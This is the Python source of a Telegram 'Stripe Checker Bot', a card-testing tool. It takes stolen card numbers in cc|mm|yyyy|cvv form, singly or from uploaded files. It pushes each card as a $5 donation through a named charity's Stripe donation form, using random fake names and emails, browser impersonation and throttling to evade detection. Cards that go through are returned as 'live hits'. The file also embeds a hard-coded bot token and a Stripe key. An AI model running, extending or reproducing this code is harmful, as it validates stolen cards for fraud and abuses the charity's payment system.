import uuid
import asyncio
import json
import random
import time
import re
import os
import io
import sys
import logging
from datetime import datetime
from curl_cffi.requests import AsyncSession
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict, NetworkError

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════
BOT_TOKEN = "8775997110:AAHOKmR0uyBiPQWcUD_BSf0NKrzbcaYD7pM"
MAX_CONCURRENT = 2       
DELAY_BETWEEN = (3, 6)   

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
#  BROWSER HEADERS
# ═══════════════════════════════════════════════════════
PAGE_HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
}

# ═══════════════════════════════════════════════════════
#  HELPER
# ═══════════════════════════════════════════════════════
def extract_between(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return ""


def extract_csrf(html):
    token = extract_between(html, 'name="csrf-token" content="', '"')
    if token:
        return token
    patterns = [
        r'csrf-token["\s]*content="([^"]+)"',
        r'content="([^"]+)"[^>]*name="csrf-token"',
        r'authenticity_token.*?value="([^"]+)"',
        r'"csrf_token":"([^"]+)"',
        r'name="wpfs-nonce" value="([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""


def extract_stripe_key(html):
    m = re.search(r'pk_live_[A-Za-z0-9]+', html)
    if m:
        return m.group(0)
    return 'pk_live_51KT2RvLSYBr599jmUYDUirjEvD3cu9kWKRQ6uJdleVILixsGu9vAl6gyT375v9hbm3GNAYU5rHg94eYLl4HEG77H004qAfe7Cc'


# ═══════════════════════════════════════════════════════
#  STRIPE CHECKER CORE
# ═══════════════════════════════════════════════════════
async def check_card(full, session):
    try:
        full = full.strip()
        if not full or "|" not in full:
            return "Invalid format ❌"

        parts = full.split("|")
        if len(parts) != 4:
            return "Invalid format (need cc|mm|yyyy|cvv) ❌"

        cc, mm, yyyy, cvv = [p.strip() for p in parts]

        if not cc.isdigit() or len(cc) < 13:
            return "Invalid card number ❌"
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return "Invalid month ❌"
        if not cvv.isdigit() or len(cvv) < 3:
            return "Invalid CVV ❌"

        if len(yyyy) == 2:
            yyyy = f'20{yyyy}'

        first_names = ['James', 'John', 'Robert', 'Michael', 'William',
                       'David', 'Richard', 'Joseph', 'Thomas', 'Charles',
                       'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones',
                      'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
                      'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson']

        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        full_name = f"{first_name} {last_name}"
        mail = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"

        # ─── Step 1: Visit donation page ───
        try:
            r1 = await session.get(
                'https://glowforhopenfp.org/donate/',
                headers=PAGE_HEADERS,
                timeout=30
            )
        except Exception as e:
            return f"Connection error: {str(e)[:80]}"

        if r1.status_code != 200:
            return f"Page load failed ({r1.status_code})"

        if 'captcha' in r1.text.lower() or 'geo.captcha-delivery' in r1.text.lower():
            return "Captcha Block ⚠️"

        stripe_key = extract_stripe_key(r1.text)
        
        # ─── Step 2: Create Stripe Payment Method ───
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }

        stripe_payload = {
            'type': 'card',
            'billing_details[name]': full_name,
            'billing_details[email]': mail,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yyyy,
            'payment_user_agent': 'stripe.js/927f625145; stripe-js-v3/927f625145; card-element',
            'key': stripe_key,
        }

        try:
            r3 = await session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_payload,
                timeout=30
            )
        except Exception as e:
            return f"Stripe request error: {str(e)[:80]}"

        try:
            pm_data = r3.json()
        except json.JSONDecodeError:
            return "Stripe response parse error ⚠️"

        if 'error' in pm_data:
            err = pm_data['error']
            code = err.get('decline_code') or err.get('code', '')
            msg = err.get('message', code)
            return f"Declined ❌ {msg}"

        pm = pm_data.get('id')
        if not pm:
            return "Payment Method ID not found ⚠️"

        # ─── Step 3: Finalize Checkout ───
        wp_ajax_url = 'https://glowforhopenfp.org/wp-admin/admin-ajax.php'
        
        form_key = extract_between(r1.text, 'wpfs-card-holder-email--', '"')
        if not form_key:
            form_key = 'ZGI2N2F' 
            
        checkout_payload = {
            'action': 'wpfs_submit_form',
            'form_key': form_key,
            'payment_method_id': pm,
            'email': mail,
            'full_name': full_name,
            'amount': 500, # $5.00
            'recurring': 'false',
            'cover_fees': 'false'
        }
        
        try:
            r4 = await session.post(
                wp_ajax_url,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data=checkout_payload,
                timeout=30
            )
            
            resp_text = r4.text.lower()
            if "success" in resp_text:
                return "Approved ✅"
            elif "insufficient" in resp_text:
                return "Insufficient Funds ✅"
            elif "incorrect_cvc" in resp_text or "security code is incorrect" in resp_text:
                return "Incorrect CVC ✅"
            elif "requires_action" in resp_text or "3d_secure" in resp_text or "authenticate" in resp_text:
                return "3DS Required ✅"
            else:
                try:
                    resp_json = r4.json()
                    if resp_json.get('requires_action') or resp_json.get('data', {}).get('requires_action'):
                        return "3DS Required ✅"
                    error_msg = resp_json.get('data', {}).get('message', r4.text[:50])
                    return f"Declined ❌ {error_msg}"
                except:
                    return f"Declined ❌ {r4.text[:50]}"
                    
        except Exception as e:
            return f"Checkout error: {str(e)[:80]}"

    except Exception as e:
        return f"Error: {str(e)[:80]}"


# ═══════════════════════════════════════════════════════
#  TELEGRAM BOT LOGIC
# ═══════════════════════════════════════════════════════

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 <b>Welcome to Stripe Checker Bot!</b>\n\n"
        "I can check Stripe cards using <code>glowforhopenfp.org</code>.\n\n"
        "📝 <b>How to use:</b>\n"
        "• Send a single card: <code>cc|mm|yyyy|cvv</code>\n"
        "• Send a .txt file with multiple cards\n\n"
        "🚀 <i>Version 3.3 Final (Enhanced 3DS)</i>",
        parse_mode='HTML'
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Just send me your cards in <code>cc|mm|yyyy|cvv</code> format.", parse_mode='HTML')


async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_line = update.message.text.strip()
    if "|" not in card_line:
        return

    status_msg = await update.message.reply_text("⏳ <i>Checking card...</i>", parse_mode='HTML')
    
    async with AsyncSession(impersonate="chrome") as session:
        result = await check_card(card_line, session)
    
    status_emoji = get_status_emoji(result)
    label = get_status_label(result)
    
    await status_msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  {status_emoji} {label}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{card_line}</code>\n"
        f"📋 {result}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )


async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return

    file = await context.bot.get_file(document.file_id)
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8').splitlines()
    lines = [line.strip() for line in lines if line.strip() and "|" in line]

    if not lines:
        await update.message.reply_text("❌ No valid cards found in file.")
        return

    total = len(lines)
    checked = 0
    results = {'live': [], 'dead': [], 'error': []}

    status_msg = await update.message.reply_text(
        f"⏳ <b>Starting check...</b>\nTotal: {total}",
        parse_mode='HTML'
    )

    start_time = time.time()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    lock = asyncio.Lock()

    async def check_with_semaphore(card_line):
        nonlocal checked
        async with semaphore:
            async with AsyncSession(impersonate="chrome") as session:
                result = await check_card(card_line, session)
            await asyncio.sleep(random.uniform(*DELAY_BETWEEN))

        async with lock:
            checked += 1
            current_checked = checked

        result_str = str(result)
        is_live = any(kw in result_str for kw in [
            "Approved", "Insufficient", "3DS", "CCN Live",
            "Security Code Error", "Incorrect CVC"
        ])

        if is_live:
            results['live'].append((card_line, result))
            try:
                await update.message.reply_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"  ✅ 𝗟𝗜𝗩𝗘 𝗛𝗜𝗧!\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 <code>{card_line}</code>\n"
                    f"📋 {result}\n"
                    f"[{current_checked}/{total}]\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='HTML'
                )
            except Exception:
                pass
        elif any(kw in result_str for kw in ["Declined", "Expired", "Stolen", "Do Not Honor", "Restricted", "Pickup"]):
            results['dead'].append((card_line, result))
        else:
            results['error'].append((card_line, result))

        if current_checked % 2 == 0 or current_checked == total:
            elapsed = round(time.time() - start_time, 2)
            progress_bar = create_progress_bar(current_checked, total)
            try:
                await status_msg.edit_text(
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"  ⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"{progress_bar} {current_checked}/{total}\n\n"
                    f"✅ Live: <b>{len(results['live'])}</b>\n"
                    f"❌ Dead: <b>{len(results['dead'])}</b>\n"
                    f"⚠️ Error: <b>{len(results['error'])}</b>\n"
                    f"⏱ Time: {elapsed}s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='HTML'
                )
            except Exception:
                pass

    tasks = [check_with_semaphore(line) for line in lines]
    await asyncio.gather(*tasks)

    total_time = round(time.time() - start_time, 2)

    summary = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  📊 𝗙𝗶𝗻𝗮𝗹 𝗦𝘂𝗺𝗺𝗮𝗿𝘆\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 Total: <b>{total}</b>\n"
        f"✅ Live: <b>{len(results['live'])}</b>\n"
        f"❌ Dead: <b>{len(results['dead'])}</b>\n"
        f"⚠️ Error: <b>{len(results['error'])}</b>\n"
        f"⏱ Total Time: <b>{total_time}s</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

    await update.message.reply_text(summary, parse_mode='HTML')

    if results['live']:
        hits_content = "\n".join(
            [f"{card} | {res}" for card, res in results['live']]
        )
        hits_file = io.BytesIO(hits_content.encode('utf-8'))
        hits_file.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        await update.message.reply_document(
            document=hits_file,
            caption=f"✅ Live Cards ({len(results['live'])} hits)"
        )


def get_status_emoji(result):
    result_str = str(result)
    if any(kw in result_str for kw in ["Approved", "Insufficient", "3DS", "CCN Live", "Incorrect CVC"]):
        return "✅"
    elif any(kw in result_str for kw in ["Declined", "Expired", "Do Not Honor"]):
        return "❌"
    else:
        return "⚠️"


def get_status_label(result):
    result_str = str(result)
    if "Approved" in result_str:
        return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif "Insufficient" in result_str or "CCN Live" in result_str:
        return "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
    elif "3DS" in result_str:
        return "𝟯𝗗𝗦 𝗟𝗜𝗩𝗘"
    elif "Incorrect CVC" in result_str:
        return "𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗖𝗩𝗖"
    elif any(kw in result_str for kw in ["Declined", "Do Not Honor"]):
        return "𝗗𝗘𝗔𝗗"
    else:
        return "𝗥𝗘𝗦𝗨𝗟𝗧"


def create_progress_bar(current, total, length=10):
    filled = int(length * current / total) if total > 0 else 0
    bar = "█" * filled + "░" * (length - filled)
    percent = int(100 * current / total) if total > 0 else 0
    return f"[{bar}] {percent}%"


def main():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("  💳 Stripe Checker Bot v3.3")
    print("  Status: Enhanced 3DS Detection")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    try:
        app = Application.builder().token(BOT_TOKEN).build()

        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(MessageHandler(filters.Document.ALL, process_file))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_single_card))

        print("  Bot is running!")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        app.run_polling(drop_pending_updates=True, stop_signals=None)
        
    except Conflict:
        print("❌ Error: Conflict! Another instance is running.")
    except Exception as e:
        print(f"❌ Critical Error: {e}")


if __name__ == "__main__":
    main()
